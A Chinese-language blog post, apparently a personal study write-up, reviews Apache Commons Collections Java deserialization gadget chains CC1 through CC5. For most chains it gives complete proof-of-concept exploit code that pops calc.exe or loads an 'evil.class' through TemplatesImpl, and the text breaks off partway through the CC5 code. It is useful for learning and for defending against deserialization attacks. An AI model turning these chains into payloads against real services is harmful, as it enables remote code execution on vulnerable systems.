@@ -1,0 +1,1245 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化链二周目 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化链二周目 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+最近缺席是学不进去，有点迷茫，不知道该怎么去学，是选择几个源码做一下代码审计还是继续深入研究java呢？也可能和我最近身体状态不好有关吧，只能选择二刷/三刷前面的反序列化链，学了反序列化链也有一段时间了，这次来好好整理一下
+CC1
+主..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化链二周目
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                38 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>最近缺席是学不进去，有点迷茫，不知道该怎么去学，是选择几个源码做一下代码审计还是继续深入研究java呢？也可能和我最近身体状态不好有关吧，只能选择二刷/三刷前面的反序列化链，学了反序列化链也有一段时间了，这次来好好整理一下</p>
+<h1 id="cc1">CC1</h1>
+<p>主要用到ConstantTransformer,InvokerTransformer,ChainedTransformer这几个类。ConstantTransformer类实现了Transformer接口，其transform方法作用是获取一个对象类型</p>
+<pre><code class="language-java">public ConstantTransformer(Object constantToReturn) {
+    this.iConstant = constantToReturn;
+}
+
+public Object transform(Object input) {
+    return this.iConstant;
+}
+</code></pre>
+<p>InvokerTransformer类实现了Transformer和Serializable接口，重写了transform方法，他的transform方法是用反射调用指定的方法并且进行返回他的结果，</p>
+<pre><code class="language-java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+    this.iMethodName = methodName;
+    this.iParamTypes = paramTypes;
+    this.iArgs = args;
+}
+
+public Object transform(Object input) {
+    if (input == null) {
+        return null;
+    } else {
+        try {
+            Class cls = input.getClass();
+            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+            return method.invoke(input, this.iArgs);
+        } catch (NoSuchMethodException var5) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+        } catch (IllegalAccessException var6) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+        } catch (InvocationTargetException var7) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var7);
+        }
+    }
+}
+</code></pre>
+<p>ChainedTransformer也是实现了Transformer和Serializable接口，其transform循环调用了transformers数组里的所有transform方法，把上一个transfromer的transform方法的结果返回作为下一个transfromer的transform方法的参数，我们可以用这三个来写一个小demo弹出计算器。<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220419200534267.png" alt="image-20220419200534267" loading="lazy"></p>
+<p>demo如下</p>
+<pre><code class="language-java">package cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+
+public class Test {
+    public static void main(String[] args) {
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        chainedTransformer.transform(&quot;ch1e&quot;);
+    }
+}
+</code></pre>
+<p>目前还是手动去调用chainedTransformer的transform方法，我们需要找到自动调用，即从readObject方法开始就可以自动调用到chainedTransformer的transform方法。</p>
+<h2 id="transformedmap">TransformedMap</h2>
+<p>TransformedMap这条链的调用顺序如下，从AnnotationInvocationHandler的readObject方法开始看</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411171838421.png" alt="img" loading="lazy"></figure>
+<p>最后调用了v5.setValue，但是v5是通过var4.next获取的，v4是通过this.memberValues.entrySet().iterator()获取的，所以v5就是this.memberValues.entrySet().iterator().next()获取，只要让this.memberValues是TransformedMap对象即可，所以我们只需要反射调用获取一个AnnotationInvocationHandler类即可，demo如下，这里还有个小坑，<code>hashedMap.put(&quot;value&quot;,&quot;ch1e&quot;);</code>这一步的value位置不能换，因为在AnnotationInvocationHandler中有这么一个判断，memberType != null，memberType 是通过memberTypes.get(name)获取，此时只有一个键值对的键名是value，所以我们让他不为空需要把键名设置为value<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220419205733465.png" alt="image-20220419205733465" loading="lazy"></p>
+<pre><code class="language-java">package cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.HashedMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.util.Map;
+
+public class test {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashedMap hashedMap = new HashedMap();
+        hashedMap.put(&quot;value&quot;,&quot;ch1e&quot;);
+        Map transformedMap= TransformedMap.decorate(hashedMap,null,chainedTransformer);
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor con = clazz.getDeclaredConstructor(Class.class, Map.class);
+        con.setAccessible(true);
+        Object o = con.newInstance(Retention.class, transformedMap);
+        serialize(o);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="../../../../../Users/86155/AppData/Roaming/Typora/typora-user-images/image-20220419205338862.png" alt="image-20220419205338862" loading="lazy"></figure>
+<h2 id="lazymap">LazyMap</h2>
+<p>LazyMap这条链可以用到动态代理，LazyMap的get方法如下，调用了this.factory.transform</p>
+<pre><code class="language-java">public Object get(Object key) {
+    if (!super.map.containsKey(key)) {
+        Object value = this.factory.transform(key);
+        super.map.put(key, value);
+        return value;
+    } else {
+        return super.map.get(key);
+    }
+}
+</code></pre>
+<p>寻找调用get方法的地方，在AnnotationInvocationHandler的invoke方法中，满足方法名不是equals，toString，hashCode，annotationType，并且方法要没有参数，其实在AnnotationInvocationHandler类的readObject中刚好调用到了memberValues.entrySet()，我们只需要把memberValues作为我们动态代理的类，调用他的entrySet方法自动去调用AnnotationInvocationHandler的invoke方法。</p>
+<pre><code class="language-java">if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+    paramTypes[0] == Object.class)
+    return equalsImpl(args[0]);
+assert paramTypes.length == 0;
+if (member.equals(&quot;toString&quot;))
+    return toStringImpl();
+if (member.equals(&quot;hashCode&quot;))
+    return hashCodeImpl();
+if (member.equals(&quot;annotationType&quot;))
+    return type;
+
+// Handle annotation member accessors
+Object result = memberValues.get(member);
+</code></pre>
+<p>所以我们只需要动态代理一个类，然后把他作为memberValues，即可完成反序列化攻击</p>
+<pre><code class="language-java">package cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.HashedMap;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Map;
+
+public class LazyMapTest {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashedMap hashedMap = new HashedMap();
+        hashedMap.put(&quot;value&quot;,&quot;ch1e&quot;);
+        LazyMap decorate = (LazyMap) LazyMap.decorate(hashedMap, chainedTransformer);
+        Class clazz=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);
+        Object object=declaredConstructor.newInstance(Retention.class,mapProxy);
+        serialize(object);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>两条链在poc上的区别就是LazyMap这条只是把第一条里面transformedMap换成了代理类</p>
+<h1 id="cc2">CC2</h1>
+<p>版本限制：Commons-Collections 4.0</p>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>调用链如下</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220420143000133.png" alt="image-20220420143000133" loading="lazy"></figure>
+<p>TransformingComparator类构造方法publice，调用了自身的transformer的transform方法</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172747223.png" alt="image-20220411172747223" loading="lazy"></figure>
+<p>在PriorityQueue类的siftDownUsingComparator调用了自身的comparator的compare方法，只需要让这里的comparator为TransformingComparator类，并且TransformingComparator类的transformer为ChainedTransformer类即可</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172753873.png" alt="image-20220411172753873" loading="lazy"></figure>
+<p>Demo如下:</p>
+<pre><code class="language-java">package cc2;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.util.PriorityQueue;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(111,transformingComparator);
+        queue.add(123);
+        queue.add(456);
+        
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>但是还是之前那个问题，在序列化的时候触发了。在add的时候，触发了siftUpUsingComparator方法。所以我们要先设置一个假的transformer，然后在添加完元素以后再重新设置成真的</p>
+<pre><code class="language-java">package cc2;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        Transformer[] faketransformer=new Transformer[]{new ConstantTransformer(1)};
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(faketransformer);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(111,transformingComparator);
+        queue.add(123);
+        queue.add(456);
+        Class clazz=ChainedTransformer.class;
+        Field iTransformers = clazz.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+//        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<h1 id="cc3">CC3</h1>
+<p>一般情况下，defineClass的作用域一般是不开放的，但是这里就刚好遇到了一个TemplatesImpl，TemplatesImpl位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，他定义了一个内部类TransletClassLoader，TransletClassLoader的defineClass方法如下，这个内部类重写了defineClass方法，并且是缺省类型，同包下可以访问，就可以被外部调用，我们可以通过他去加载字节码</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173100927.png" alt="img" loading="lazy"></figure>
+<p>所以我们只需要反射获取一个TemplatesImpl的类，然后设置_class为null，_tfactory为一个TransformerFactoryImpl类，_bytecodes为恶意类的字节码，并且恶意类需要继承自AbstractTranslet，否则会报错</p>
+<pre><code class="language-java">package cc3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class clazz=templates.getClass();
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;ch1e&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] bytes= Files.readAllBytes(Paths.get(&quot;D:\\evil.class&quot;));
+        byte[][] codes={bytes};
+        bytecodes.set(templates,codes);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        templates.newTransformer();
+    }
+}
+</code></pre>
+<p>但是这样还是是手动触发，我们需要让他自动触发，有两个方法，一个就是用cc1链的后半部分来触发，只需要改成如下即可</p>
+<pre><code class="language-java">package cc3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class clazz=templates.getClass();
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;ch1e&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] bytes= Files.readAllBytes(Paths.get(&quot;D:\\evil.class&quot;));
+        byte[][] codes={bytes};
+        bytecodes.set(templates,codes);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;,null,null)};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap hashMap=new HashMap();
+        hashMap.put(&quot;value&quot;,&quot;key&quot;);
+        Map outerMap = LazyMap.decorate(hashMap, chainedTransformer);
+        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler=(InvocationHandler) constructor.newInstance(Retention.class,outerMap);
+        Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
+        Object o = constructor.newInstance(Retention.class, proxyMap);
+        serialize(o);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>但是在ysoserial里面，是通过TrAXFilter类去实现，构造函数调用了自身templates的newTransformer()方法</p>
+<pre><code class="language-java">public TrAXFilter(Templates templates)  throws
+    TransformerConfigurationException
+{
+    _templates = templates;
+    _transformer = (TransformerImpl) templates.newTransformer();
+    _transformerHandler = new TransformerHandlerImpl(_transformer);
+    _useServicesMechanism = _transformer.useServicesMechnism();
+}
+</code></pre>
+<p>我们只需要把上面之前的templates传入即可。但是问题来了，TrAXFilter对象并没有实现Serializable 接口，所以其他地方入手。除了TrAXFilter类以外，还用到InstantiateTransformer这个类，构造方法如下</p>
+<pre><code class="language-java">public InstantiateTransformer(Class[] paramTypes, Object[] args) {
+    this.iParamTypes = paramTypes;
+    this.iArgs = args;
+}
+</code></pre>
+<p>transform方法如下</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220419222231219.png" alt="image-20220419222231219" loading="lazy"></figure>
+<p>我们需要传入一个Class和Object数组，他会把传入的参数作为input的构造函数的参数传入，相当于他调用了构造函数，所以我们这里只需要通过transform去创建一个TrAXFilter类即可</p>
+<pre><code class="language-java">package cc3;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class clazz=templates.getClass();
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;ch1e&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] bytes= Files.readAllBytes(Paths.get(&quot;D:\\evil.class&quot;));
+        byte[][] codes={bytes};
+        bytecodes.set(templates,codes);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        instantiateTransformer.transform(TrAXFilter.class);
+    }
+}
+</code></pre>
+<h1 id="cc4">CC4</h1>
+<p>不同于CC2的是使用InstantiateTransformer替换了InvokerTransformer，InstantiateTransformer在上面的cc3也遇到过，，他的transform方法实现了一个反射调用构造函数初始化一个类的功能</p>
+<pre><code class="language-java">final Constructor&lt;? extends T&gt; con = input.getConstructor(iParamTypes);
+return con.newInstance(iArgs);
+</code></pre>
+<p>demo如下</p>
+<pre><code class="language-java">package cc4;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class clazz=templates.getClass();
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;ch1e&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] bytes= Files.readAllBytes(Paths.get(&quot;D:\\evil.class&quot;));
+        byte[][] codes={bytes};
+        bytecodes.set(templates,codes);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                instantiateTransformer,
+        };
+        Transformer[] faketransformer=new Transformer[]{new ConstantTransformer(1)};
+        ChainedTransformer chainedTransformer=new ChainedTransformer(faketransformer);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(111,transformingComparator);
+        queue.add(123);
+        queue.add(456);
+        Class c=ChainedTransformer.class;
+        Field iTransformers = c.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>CC2和CC4的区别不同就在于链子末尾不同，起点都是一样的。所以我们只要把之前的InvokerTransformer那部分用InstantiateTransformer替换即可</p>
+<h1 id="cc5">CC5</h1>
+<pre><code>Gadget chain:
+       ObjectInputStream.readObject()
+           BadAttributeValueExpException.readObject()
+               TiedMapEntry.toString()
+                   LazyMap.get()
+                       ChainedTransformer.transform()
+                           ConstantTransformer.transform()
+                           InvokerTransformer.transform()
+                               Method.invoke()
+                                   Class.getMethod()
+                           InvokerTransformer.transform()
+                               Method.invoke()
+                                   Runtime.getRuntime()
+                           InvokerTransformer.transform()
+                               Method.invoke()
+                                   Runtime.exec()
+
+</code></pre>
+<p>lazymap.get后面的都很熟，看BadAttributeValueExpException.readObject()和TiedMapEntry.toString()</p>
+<p>在BadAttributeValueExpException的readObject中调用了toString，valObj是获取val属性的值，为了下一步执行到TiedMapEntry.toString，所以valObj要是TiedMapEntry对象</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172812425.png" alt="img" loading="lazy"></figure>
+<p>TiedMapEntry.toString调用了自身的getValue方法，getValue调用了自身map属性的get方法，所以我们需要满足TiedMapEntry的map属性是LazyMap类的对象，这里的话应该是要jdk1.8.我jdk1.7不行</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        org.apache.commons.collections.Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
